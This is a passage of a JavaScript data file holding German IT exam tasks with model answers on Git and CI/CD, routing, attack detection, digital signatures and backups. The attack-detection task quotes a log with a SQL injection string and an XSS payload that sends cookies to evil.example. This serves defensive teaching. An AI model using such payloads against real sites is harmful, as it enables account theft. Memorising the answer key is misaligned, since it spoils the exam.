      {pts: 6, rows: 8, topic: 'Git und CI/CD', q: 'a) Beschreiben Sie einen Feature-Branch-Workflow mit Git (Befehle für: Branch anlegen, Änderung sichern, auf den Server übertragen) und wie Änderungen per Pull Request in main gelangen. b) Beim Mergen tritt ein **Konflikt** in tarif.py auf. Wie lösen Sie ihn? c) Nennen Sie vier sinnvolle Stufen einer CI/CD-Pipeline.',
        a: [['code', 'text', `git switch -c feature/abo-rabatt      # Branch anlegen und wechseln
git add tarif.py                      # Änderung vormerken
git commit -m "Abo-Rabatt nach Deckelung abziehen"
git push -u origin feature/abo-rabatt # Branch auf den Server
# danach Pull Request (Merge Request): Code-Review, automatische Tests, dann Merge in main`],
          'b) Git markiert die Stelle mit **<<<<<<<, =======, >>>>>>>**. Beide Versionen prüfen, die richtige bzw. zusammengeführte Fassung von Hand herstellen, Marker entfernen, Tests ausführen, dann **git add tarif.py** und **git commit** (bzw. git merge --continue). Bei Unklarheit mit dem Autor der anderen Änderung sprechen.', 'c) **Build** (kompilieren, Container-Image), **Unit- und Integrationstests**, **statische Codeanalyse / Sicherheits-Scan** (zum Beispiel Abhängigkeiten auf bekannte Schwachstellen), **Deployment in eine Test-/Staging-Umgebung**, Abnahme bzw. End-to-End-Tests, **Deployment in Produktion** (Continuous Delivery mit Freigabe, Continuous Deployment automatisch).'],
        sol: [['diagram', {w: 760, h: 170, keep: 620, cap: 'Feature-Branch: Abzweigen von main, Commits auf dem Branch, Merge per Pull Request', nodes: [
          {id: 'm1', k: 'circle', x: 60, y: 50, w: 30, h: 30, t: ''}, {id: 'm2', k: 'circle', x: 180, y: 50, w: 30, h: 30, t: ''}, {id: 'm3', k: 'circle', x: 420, y: 50, w: 30, h: 30, t: ''}, {id: 'm4', k: 'circle', x: 600, y: 50, w: 34, h: 34, t: 'M', s: 'solid'},
          {id: 'f1', k: 'circle', x: 280, y: 125, w: 30, h: 30, t: '', s: 'accent'}, {id: 'f2', k: 'circle', x: 400, y: 125, w: 30, h: 30, t: '', s: 'accent'}, {id: 'f3', k: 'circle', x: 510, y: 125, w: 30, h: 30, t: '', s: 'accent'},
          {id: 'lm', k: 'text', x: 700, y: 50, t: 'main', w: 10, h: 10, b: true}, {id: 'lf', k: 'text', x: 640, y: 125, t: 'feature/abo-rabatt', w: 10, h: 10},
        ], edges: [{a: 'm1', b: 'm2'}, {a: 'm2', b: 'm3'}, {a: 'm3', b: 'm4'}, {a: 'm2', b: 'f1'}, {a: 'f1', b: 'f2'}, {a: 'f2', b: 'f3'}, {a: 'f3', b: 'm4', t: 'Pull Request'}]}],
          ['diagram', AP2.dg.flow(['Commit / Push', 'Build', 'Tests', 'Code-Analyse', 'Staging', 'Produktion'], {w: 780, h: 100, bw: 115, styles: ['plain', 'accent', 'accent', 'accent', 'gold', 'ok'], cap: 'CI/CD-Pipeline: Jede Stufe muss grün sein, bevor die nächste startet'})]],
        see: ['ps-git', 'ps-ide']},
    ],
  });
  AP2.exam.part(ID, {
    t: 'Handlungsschritt 4: Infrastruktur und IT-Sicherheit (25 Punkte)',
    tasks: [
      {pts: 7, rows: 9, topic: 'Routing', q: 'Vervollständigen Sie die Routingtabelle von Router **R1** (Ziel/Präfix, Next Hop, Interface) und beantworten Sie: a) Über welchen Next Hop gelangt ein Paket an **10.10.100.7**? b) Der Provider-Router soll die beiden Büronetze 10.10.0.0/24 und 10.10.1.0/24 mit **einem** Eintrag erreichen. Wie lautet die zusammengefasste Route?',
        ctx: [['diagram', {w: 860, h: 300, keep: 700, cap: 'Netzwerk VeloCity (Ausschnitt)', nodes: [
          {id: 'lan0', k: 'box', x: 110, y: 60, w: 190, h: 50, t: ['Zentrale LAN', '10.10.0.0/24'], s: 'soft'}, {id: 'r1', k: 'circle', x: 330, y: 150, w: 70, h: 70, t: 'R1', s: 'accent'},
          {id: 'r2', k: 'circle', x: 600, y: 60, w: 70, h: 70, t: 'R2', s: 'accent'}, {id: 'lan1', k: 'box', x: 770, y: 60, w: 160, h: 50, t: ['Werkstatt', '10.10.1.0/24'], s: 'soft'},
          {id: 'r3', k: 'circle', x: 600, y: 240, w: 70, h: 70, t: 'R3', s: 'accent'}, {id: 'lan3', k: 'box', x: 770, y: 240, w: 160, h: 50, t: ['Stationsnetz', '10.10.64.0/18'], s: 'soft'},
          {id: 'isp', k: 'oval', x: 110, y: 240, w: 170, h: 60, t: ['Provider', '203.0.113.1'], s: 'gold'},
        ], edges: [{a: 'lan0', b: 'r1', ea: 'none', t: 'eth0 .1'}, {a: 'r1', b: 'r2', ea: 'none', t: 'eth1: 192.168.255.0/30 (.1 / .2)'}, {a: 'r1', b: 'r3', ea: 'none', t: 'eth2: 192.168.255.4/30 (.5 / .6)'},
          {a: 'r2', b: 'lan1', ea: 'none'}, {a: 'r3', b: 'lan3', ea: 'none'}, {a: 'r1', b: 'isp', ea: 'none', t: 'eth3'}]}]],
        a: [['table', ['Ziel / Präfix', 'Next Hop', 'Interface'], [['10.10.0.0/24', 'direkt verbunden', 'eth0'], ['192.168.255.0/30', 'direkt verbunden', 'eth1'], ['192.168.255.4/30', 'direkt verbunden', 'eth2'], ['10.10.1.0/24', '**192.168.255.2** (R2)', 'eth1'], ['10.10.64.0/18', '**192.168.255.6** (R3)', 'eth2'], ['0.0.0.0/0 (Default)', '**203.0.113.1**', 'eth3']]],
          'a) 10.10.100.7 liegt in **10.10.64.0/18** (10.10.64.0 bis 10.10.127.255), also Next Hop **192.168.255.6** (R3).', 'b) 10.10.0.0/24 und 10.10.1.0/24 unterscheiden sich erst im **letzten Bit des dritten Oktetts** (0000 0000 / 0000 0001): Zusammenfassung **10.10.0.0/23**.', 'Bewertung: Tabelle 4 P (Default-Route zwingend), a) 1,5 P, b) 1,5 P.'],
        sol: [['table', ['3. Oktett', 'binär', ''], [['0', '0000 000**0**', '10.10.0.0/24'], ['1', '0000 000**1**', '10.10.1.0/24'], ['gemeinsam', '**0000 000**x', '23 gleiche Bits: 10.10.0.0/23']]], ['tool', 'route']],
        see: ['infra-routing', 'infra-subnetting']},
      {pts: 6, rows: 8, topic: 'Angriffe erkennen', q: 'Im Webserver-Log der App-API finden Sie die Einträge der Anlage. Benennen Sie die drei Angriffsarten, beurteilen Sie, ob der erste Angriff vermutlich erfolgreich war, und nennen Sie je zwei Gegenmaßnahmen.',
        ctx: [['code', 'text', `203.0.113.45 [02/Nov/2026:03:12:01] "GET /api/stationen?id=7%27%20OR%20%271%27%3D%271 HTTP/1.1" 200 51234
198.51.100.9 [02/Nov/2026:03:14:22] "POST /login HTTP/1.1" 401 112
   ... 1.840 weitere POST /login von 198.51.100.9 innerhalb von 10 Minuten, Benutzer "admin", wechselnde Passwörter
192.0.2.77   [02/Nov/2026:03:20:10] "POST /api/feedback HTTP/1.1" 201 88
   Body: {"text": "<script>fetch('https://evil.example/c?'+document.cookie)</script>"}`]],
        a: ['1. **SQL-Injection**: Der Parameter enthält URL-kodiert **7\' OR \'1\'=\'1**. Status 200 und eine **ungewöhnlich große Antwort (51 KB)** deuten auf **Erfolg** hin (vermutlich alle Datensätze statt einer Station). Maßnahmen: **Prepared Statements**, Eingabevalidierung (id muss Zahl sein), minimale DB-Rechte, Web Application Firewall.', '2. **Brute-Force-Angriff** (Passwortraten, eventuell Credential Stuffing) auf das Konto admin. Maßnahmen: **Rate Limiting**/temporäre Sperre nach Fehlversuchen, **Zwei-Faktor-Authentisierung**, kein Standard-Benutzername "admin", Alarmierung, IP sperren (Fail2ban).', '3. **Stored (persistentes) Cross-Site-Scripting (XSS)**: Das Skript wird gespeichert und bei anderen Nutzern (zum Beispiel im Admin-Backend) ausgeführt, um Session-Cookies zu stehlen. Maßnahmen: **kontextgerechte Ausgabekodierung** (Escaping), **Content Security Policy**, Cookies mit **HttpOnly** und Secure, Eingaben validieren bzw. bereinigen.'],
        sol: [['note', 'Dekodiert: %27 = \' , %20 = Leerzeichen, %3D = = . Aus id=7%27%20OR%20%271%27%3D%271 wird id=7\' OR \'1\'=\'1. Ist die Abfrage als Zeichenkette zusammengesetzt, lautet sie ... WHERE id = \'7\' OR \'1\'=\'1\' und liefert alle Zeilen.']],
        see: ['infra-angriffe', 'infra-websec', 'infra-schwachstellen']},
      {pts: 6, rows: 8, topic: 'Digitale Signatur', q: 'Der Schlosshersteller verteilt **Firmware-Updates** über LTE. a) Beschreiben Sie, wie eine **digitale Signatur** sicherstellt, dass nur echte Firmware installiert wird (welcher Schlüssel wird wo verwendet?). b) Die Firmware soll zusätzlich vertraulich übertragen werden. Erklären Sie das Prinzip der **hybriden Verschlüsselung**.',
        a: ['a) Der Hersteller berechnet den **Hashwert** der Firmware und verschlüsselt ihn mit seinem **privaten Schlüssel**: das ist die **Signatur**. Das Schloss enthält ab Werk den **öffentlichen Schlüssel** des Herstellers (oder dessen Zertifikat). Es berechnet selbst den Hash der empfangenen Firmware, entschlüsselt die Signatur mit dem öffentlichen Schlüssel und vergleicht beide Werte. Nur bei Gleichheit wird installiert: **Integrität und Authentizität** sind belegt. Der private Schlüssel verlässt nie den Hersteller (HSM).', 'b) **Hybrid**: Die große Firmware wird mit einem zufälligen **symmetrischen Sitzungsschlüssel** (zum Beispiel AES) verschlüsselt, weil das schnell ist. Dieser kleine Schlüssel wird mit dem **öffentlichen Schlüssel des Empfängers asymmetrisch** verschlüsselt (oder per Diffie-Hellman ausgehandelt). So verbindet man die Geschwindigkeit symmetrischer mit dem einfachen Schlüsselaustausch asymmetrischer Verfahren (Prinzip von TLS).'],
        sol: [['seq', {w: 760, actors: ['Hersteller', 'Update-Server', 'Schloss'], cap: 'Signieren mit dem privaten, Prüfen mit dem öffentlichen Schlüssel', steps: [
          ['note', 0, 'Hash h = SHA-256(Firmware)'], ['note', 0, 'Signatur s = sign(h, privater Schlüssel)'], [0, 1, 'Firmware + Signatur', 's'], [1, 2, 'Firmware + Signatur (über TLS)', 's'],
          ['note', 2, 'h2 = SHA-256(Firmware)'], ['note', 2, 'verify(s, öffentlicher Schlüssel) = h2 ?'], [2, 1, 'installiert (ja) / verworfen (nein)', 'r']]}]],
        see: ['infra-krypto', 'infra-pki']},
      {pts: 6, rows: 8, topic: 'Datensicherung', q: 'Die Datenbank hat sonntags eine **Vollsicherung von 800 GB**; täglich ändern sich **40 GB** (jeden Tag andere Daten). Montag bis Samstag wird nachts gesichert. a) Berechnen Sie die Datenmenge der Sicherungen von Montag bis Samstag bei inkrementeller und bei differenzieller Sicherung. b) Am Donnerstagvormittag fällt die Datenbank aus. Welche Sicherungen brauchen Sie jeweils für die Wiederherstellung? c) Wie lange dauert allein die Übertragung der Vollsicherung über eine Verbindung mit effektiv **1 Gbit/s** (1 GB = 1.000 MB)?',
        a: ['a) **Inkrementell** (Änderungen seit der letzten Sicherung jeder Art): 6 x 40 GB = **240 GB**. **Differenziell** (Änderungen seit der letzten Vollsicherung): 40 + 80 + 120 + 160 + 200 + 240 = **840 GB**.', 'b) Inkrementell: **Vollsicherung + Montag + Dienstag + Mittwoch** (4 Sicherungen in der richtigen Reihenfolge). Differenziell: **Vollsicherung + Mittwoch** (2 Sicherungen). Daten seit Mittwochnacht sind verloren (RPO), wenn nicht zusätzlich Transaktionsprotokolle gesichert werden.', 'c) 800 GB x 8 = 6.400 Gbit; 6.400 Gbit / 1 Gbit/s = **6.400 s ≈ 107 Minuten (1 h 47 min)**.'],
        sol: [['chart', {kind: 'bar', w: 720, h: 300, labels: ['Mo', 'Di', 'Mi', 'Do', 'Fr', 'Sa'], series: [{n: 'inkrementell (GB)', d: [40, 40, 40, 40, 40, 40], k: 'text3'}, {n: 'differenziell (GB)', d: [40, 80, 120, 160, 200, 240], k: 'accent'}], vals: true, ymax: 250, yl: 'GB je Sicherung', cap: 'Differenzielle Sicherungen wachsen täglich, dafür reichen zur Wiederherstellung zwei Sicherungen'}], ['tool', 'transfer']],
        see: ['infra-backup']},
    ],
  });
  AP2.exam.end(ID);
})();
